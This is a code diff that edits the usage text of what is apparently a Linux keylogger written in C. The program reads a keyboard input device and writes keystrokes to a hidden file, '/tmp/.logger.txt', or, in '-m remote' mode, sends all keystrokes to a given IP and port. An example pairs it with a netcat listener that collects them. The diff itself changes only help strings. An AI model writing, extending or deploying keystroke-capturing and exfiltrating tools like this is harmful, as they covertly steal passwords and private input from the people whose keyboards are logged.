@@ -466,8 +466,8 @@ int main(int argc, char** argv)
 	{
 		banner();
 		fprintf(stderr,"\nUsage: #%s [OPTIONS]\n", argv[0]);
-		fprintf(stderr,"\nOPTIONS:\n\t-d: input device (if not specified, the default device is '/dev/input/by-path/***kbd')\n");
-		fprintf(stderr,"\t-o: output file. (It can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt')\n");
+		fprintf(stderr,"\nOPTIONS:\n\t-d <input-device>: if not specified, the default device is '/dev/input/by-path/***kbd'\n");
+		fprintf(stderr,"\t-o <output-file>: It can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt')\n");
 		fprintf(stderr,"\t-m remote -a <IP-ADDR> -p <PORT>: it sends all the keystrokes on the remote server located at <IP-ADDR:PORT>\n");
 		fprintf(stderr,"\nEXAMPLE\nServer$ nc lvp 8888 > logger.txt\nClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
 		exit(0);
